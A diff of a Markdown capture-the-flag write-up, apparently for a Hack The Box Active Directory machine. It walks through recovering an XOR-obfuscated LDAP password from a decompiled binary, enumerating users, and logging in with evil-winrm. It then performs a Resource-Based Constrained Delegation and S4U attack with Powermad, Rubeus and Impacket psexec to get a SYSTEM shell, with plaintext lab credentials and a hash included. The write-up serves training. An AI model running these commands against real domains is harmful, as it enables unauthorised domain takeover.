@@ -31,7 +31,7 @@ PORT      STATE SERVICE
 
 ```
 
-take the ports open and run the nmap with `-sVC` flag
+take the open ports and run the `nmap` with `-sVC` flag
 ```bash
 sudo nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49678,49690,49695,49711 10.129.224.189 -oA complete_scan
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-22 02:24 EDT
@@ -75,8 +75,8 @@ Nmap done: 1 IP address (1 host up) scanned in 96.80 seconds
 
 ```
 
-the hostname `DC` and `support.htb0` are both leaked. I'll update my `hosts` file with `10.129.224.189 DC.support.htb support.htb`
-
+the hostname `DC` and `support.htb0` are both leaked.
+I'll update my `hosts` file with `10.129.224.189 DC.support.htb support.htb`
 ## Shares Enumeration
 
 ```bash
@@ -96,8 +96,17 @@ Unable to connect with SMB1 -- no workgroup available
 
 ```
 
-TODO: Aggiungere come scaricare `iLSpy`
+# FootHold
+Under the `support-tools` folder there is `UserInfo.exe.zip` we can unzip and decompile this PE with tool like `DnsSpy` or `ILspy`. 
+Both are C# tools that work on windows machine, to use on linux you can use `wine` or u can install the [iLspy](https://github.com/icsharpcode/AvaloniaILSpy/releases/tag/v7.2-rc)
 
+To start the the decompiler run
+```bash
+cd ./support/iLSpy/artifacts/linux-x64
+./ILspy
+```
+
+under the `LdapQuery` class we can finder the `getPassword` method that decrypt a base64 string using [XOR](https://en.wikipedia.org/wiki/XOR_cipher) algorithm.
 ![[Pasted image 20250622103330.png]]
 
 to decrypt the base64 string using XOR algorithm we need the value of **key** variable.
@@ -105,10 +114,11 @@ to decrypt the base64 string using XOR algorithm we need the value of **key** va
 
 ![[Pasted image 20250622103439.png]]
 
-XOR have is bidirectional means the same method to chiper the string will be use to decrypt. We can use the same c# fuctions founded in PE file but on my kali machine i prefer to use python. This is my python script to decrypt the pasdword
+XOR have is bidirectional means the same method to cipher the string will be use to decrypt. 
+We can use the same `getPassword` c# functions founded in PE file but on my kali machine i prefer to use python. 
 
+This is my python script to decrypt the password
 ```python
-
 import base64
 
 
@@ -147,141 +157,130 @@ public static string getPassword()
 ```
 
 
-
-TODO:
-spigare che ho dovuto usare '' perche' altrimenti il dollaro viene preso come variabile
-
+Now that we have the decrypted password try to use in `ldapsearch` 
 ```bash
 ldapsearch -H LDAP://support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" "(ObjectClass=Users)"
-
 ```
+- `-D`: Bind DN (Distinguished Name) is the user with we'll use to authenticate 
+- `-w`: is the password for the account. For the complex password is better to use the `''` instance of `""` 
 
+Under description property of `support` account i found the possible password.
+![[Pasted image 20250625222528.png]]
 
-
-get all'users with ldap query
-
-```bash
-ldapsearch -H LDAP://support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" '(objectClass=User)' sAMAccountName | grep sAMAccountName
-# requesting: sAMAccountName 
-sAMAccountName: Administrator
-sAMAccountName: Guest
-sAMAccountName: DC$
-sAMAccountName: krbtgt
-sAMAccountName: ldap
-sAMAccountName: support
-sAMAccountName: smith.rosario
-sAMAccountName: hernandez.stanley
-sAMAccountName: wilson.shelby
-sAMAccountName: anderson.damian
-sAMAccountName: thomas.raphael
-sAMAccountName: levine.leopoldo
-sAMAccountName: raven.clifton
-sAMAccountName: bardot.mary
-sAMAccountName: cromwell.gerard
-sAMAccountName: monroe.david
-sAMAccountName: west.laura
-sAMAccountName: langley.lucy
-sAMAccountName: daughtler.mabel
-sAMAccountName: stoll.rachelle
-sAMAccountName: ford.victoria
-
-```
-
-
+Try to connect to through `evil-winrm`
 ```bash
 evil-winrm -u "support" -p "Ironside47pleasure40Watchful" --ip support.htb
 ```
 ![[Pasted image 20250622105158.png]]
 
+To find all groups that `support` is member of run 
+
+```bash
+whoami /groups
+```
+
 ![[Pasted image 20250624074629.png]]
 
 
-
 # Privilege Escalation
+## Enumeration with bloodhound
 
+```bash
+bloodhound-python -u 'support' -p 'Ironside47pleasure40Watchful' -ns 172.16.5.5 -d support.htb -c all
+```
+
+now put all the file generated in a zip file.
+
+```bash
+zip -r bloodhound_data *.json
+```
 ## Setup bloodhound env
 
+I use docker image to run the bloodhound GUI. [More info here](https://breachar.medium.com/install-bloodhound-ce-under-kali-linux-2024-4-2a68feebdb62)
 ```bash
 curl -L https://ghst.ly/getbhce > docker-compose.yml
 sudo docker-compose pull && sudo docker-compose up
 ```
 
 ![[Pasted image 20250624000703.png]]
-
-
-https://breachar.medium.com/install-bloodhound-ce-under-kali-linux-2024-4-2a68feebdb62
+In the output we'll see that the `Shared Support Accounts` group has `GenericAll` privileges on the
+Domain Controller and since the support user is a member of this group, they as well have all privileges on
+the DC.
 ## Resource Based Constrained Delegation
+In a nutshell, through a `Resource Based Constrained Delegation attack` we can **add a computer** under
+our control to the domain; let's call this computer $`FAKE-COMP01` , and configure the Domain Controller (DC)
+to allow $FAKE-COMP01 to act on behalf of it. 
 
+Then, by acting on behalf of the DC we can request Kerberos
+tickets for `$FAKE-COMP01` , **with the ability to impersonate a highly privileged user on the Domain**, such as
+the `Administrator`. After the Kerberos tickets are generated, we can `Pass the Ticket` (**PtT**) and authenticate
+as this privileged user, giving us control over the entire domain.
 ### MachineAccountQuota Get-ADObject
+To perform this attack the `ms-DS-MachineAccountQuota` property needs to be higher than 0. To check this property of our DC we can use `Get-ADObject` with `Get-ADDomain` modules
 
 ```bash
 Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
 ```
 ![[Pasted image 20250624074915.png]]
-### MachineAccountQuota LDAP
 
-LDAP query to extract the `ms-DS-MachineAccountQuota` from the domain class.
+We can use also the `LDAP` query to extract the `ms-DS-MachineAccountQuota` from the domain class.
 ```bash
 ldapsearch -H LDAP://support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" "(ObjectClass=domainDNS)" ms-DS-MachineAccountQuota
 ```
 
 
-import the `PowerView.ps1` module on the target machine.
+Now we need to import the `PowerView.ps1` module on the target machine. We can do that through `evil-winrm`
 ```bash
 upload PowerView.ps1
 ```
 
 ![[Pasted image 20250624075537.png]]
-Once do that we need to verify if the `msds-allowedtoactonbehalfofotheridentity` attribute is empty
 
-```bash
+Once do that we need to verify if the `msds-allowedtoactonbehalfofotheridentity` attribute is empty. We can check it with `Get-DomainComputer`
+
+```powershell
 Get-DomainComputer DC | select name,  msds-allowedtoactonbehalfofotheridentity
 ```
 
 ![[Pasted image 20250624075948.png]]
 
-The value is empty, which means we are ready to perform the ***RBCD attack***, but first let's upload the tools
+The value is empty, wich means we are ready to perform the ***RBCD attack***, but first let's upload the tools
 that are required. We will need [PowerMad](https://github.com/Kevin-Robertson/Powermad) and [Rubeus](https://github.com/GhostPack/Rubeus), which we can upload using Evil-WinRM as shown
 previously.
 
-Import Powermad.ps1
+Import `Powermad.ps1`
 ```bash
 upload Powermad.ps1
 ```
 
 #### Creating a Computer Object
-Now, let's create a fake computer and add it to the domain. We can use PowerMad's New-MachineAccount
-to achieve this.
-```bash
+Now, let's create a fake computer and add it to the domain. We can use `PowerMad's New-MachineAccount` module to achieve this.
+```powershell
 New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
 ```
 
 ![[Pasted image 20250624081609.png]]
 
-We can verify this new machine with the following command
+We can verify this new machine with the `Get-ADComputer` module
 ```bash
 Get-ADComputer -identity FAKE-COMP01
 ```
 
 ![[Pasted image 20250624081801.png]]
 in the output we can see the `SID` of this object.
-
 #### Configure RBCD
 
-Next, we will need to configure Resource-Based Constrained Delegation through one of two ways. We can
-either set the PrincipalsAllowedToDelegateToAccount value to FAKE-COMP01 through the builtin
-PowerShell Active Directory module, which will in turn configure the msds-
-allowedtoactonbehalfofotheridentity attribute on its own, or we can use the PowerView module to
-directly set the msds-allowedtoactonbehalfofotheridentity attribute
-
+Next, we will need to configure `Resource-Based Constrained Delegation` through one of two ways. 
+We can either set the `PrincipalsAllowedToDelegateToAccount` value to `FAKE-COMP01` through the built-in PowerShell Active Directory module, which will in turn configure the `msds-allowedtoactonbehalfofotheridentity` attribute on its own, or we can use the `PowerView` module to
+directly set the `msds-allowedtoactonbehalfofotheridentity` attribute
+In this case i use the `Set-ADComputer` of PowerView module
 ```bash
 Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
 ```
 
 To verify if the command above worked we can use the `Get-ADComputer` command
-
 ```bash
-et-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
+Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
 ```
 
 ![[Pasted image 20250624082211.png]]
@@ -296,38 +295,33 @@ Get-DomainComputer -Identity DC | select msds-allowedtoactonbehalfofotheridentit
 
 ![[Pasted image 20250624082453.png]]
 
-As we can see, the `msds-allowedtoactonbehalfofotheridentity` now has a value, but because the type
-of this attribute is `Raw Security Descriptor` we will have to convert the bytes to a string to understand
-what's going on.
+As we can see, the `msds-allowedtoactonbehalfofotheridentity` now has a value, but because the type of this attribute is `Raw Security Descriptor` we will have to convert the bytes to a string to understand what's going on.
 
-First, let's grab the desired value and dump it to a variable called **RawBytes**.
+First, let's grab the desired value and dump it to a variable called `RawBytes`.
 ```bash
 $RawBytes = Get-DomainComputer -Identity DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
 ```
 
 Then, let's convert these bytes to a Raw Security Descriptor object.
-```bash
+```powershell
 $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes,0
 ```
 
-Finally, we can print both the entire security descriptor, as well as the `DiscretionaryAcl` class, **which
-represents the Access Control List that specifies the machines that can act on behalf of the DC**
+Finally, we can print both the entire security descriptor, as well as the `DiscretionaryAcl` class, **which represents the Access Control List that specifies the machines that can act on behalf of the DC**
 
-```bash
+```powershell
 $Descriptor
 $Descriptor.DiscretionaryAcl
 ```
 
 ![[Pasted image 20250624083156.png]]
-From the output we can see that the `SecurityIdentifier` is set to the SID of `FAKE-COMP01` that we saw
-earlier, and the `AceType` is set to `AccessAllowed` 
-
+From the output we can see that the `SecurityIdentifier` is set to the `SID` of `FAKE-COMP01` that we saw
+earlier, and the `AceType` is set to `AccessAllowed`
 ### Performing a S4U Attack
-t is now time to perform the S4U attack, which will allow us to obtain a Kerberos ticket on behalf of the
-Administrator. We will be using Rubeus to perform this attack.
-First, we will need the hash of the password that was used to create the computer object.
+We will be using Rubeus to perform this attack to obtain Administrator ticket.
 
-```bash
+First, we will need the hash of the password that was used to create the computer object. To obtain the hash we can use `Rubeus`.
+```powershell
 upload Rubeus.exe
 
 .\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
@@ -335,7 +329,7 @@ upload Rubeus.exe
 
 ![[Pasted image 20250624085040.png]]
 
-We need to grab the value called `rc4_hmac` . Next, we can generate **Kerberos tickets for the Administrator**.
+We need to grab the value called `rc4_hmac`. Next, we can generate **Kerberos tickets for the Administrator**.
 
 ```powershell
 .\Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/
@@ -345,53 +339,58 @@ dc.support.htb /domain:support.htb /ptt
 
 ![[Pasted image 20250624085353.png]]
 
-
 Rubeus successfuly generated the tickets. We can now grab the last Base64 encoded ticket and use it on our
-local machine to get a shell on the DC as Administrator . To do so, copy the value of the last ticket and
-paste it inside a file called `ticket.kirbi.b64 `. 
+local machine to get a shell on the DC as Administrator. 
+
+To do so, copy the value of the last ticket and
+paste it inside a file called `ticket.kirbi.b64`. 
 
 > NOTE
 > Make sure to remove any whitespace characters from the value.
 
-
 ```bash
+# remove the white spaces
 tr -d '[:space:]' < ticket.kirbi.b64 > ticket.kirbi.no.whitespace
 
+# Decode the ticket
 base64 -d ticket.kirbi.no.whitespace > ticket.kirbi
 ```
 
 ![[Pasted image 20250624090549.png]]
 
-Finally, we can convert this ticket to a format that **Impacket can use**. This can be achieved with Impackets'
-`TicketConverter.py` .
+Finally, we can convert this ticket to a format that **Impacket can use**. 
+This can be achieved with Impackets `TicketConverter.py` .
 
+Because i have problem with the my python package on the machine i use a `python virtual environment`
+
+Create and activated the python env
 ```bash
 sudo python3 -m venv impacket-env
 source impacket-env/bin/activate
 ```
 
+Install impacket's tools
 ```bash
-
 sudo apt install git python3-pip -y
 git clone https://github.com/fortra/impacket.git
 cd impacket
 pip install .
-```
 
-```bash
+# navgiate under the folder where the .py script is
 cd examples
-python3 ticketConverter.py ../../ticket.kirbi ../../ticket.ccache
 ```
 
+Convert `ticket.kirbi` in `.ccache` ticket that we can use in `psexec`.
+```bash
+sudo python3 ticketConverter.py ../../ticket.kirbi ../../ticket.ccache
+```
 
-To acquire a shell we can use Impackets' `psexec.py` .
-
+To acquire a shell we can use Impackets' `psexec.py`.
 ```bash
 KRB5CCNAME=../../ticket.ccache python3 psexec.py support.htb/administrator@dc.support.htb -k -no-pass
 ```
 
 ![[Pasted image 20250624092635.png]]
 
-find the root flag 
-
+Now we have a `nt autority\system`'s shell. Under the Administrators tools we can get the `root` flag 
 ![[Pasted image 20250624092854.png]]
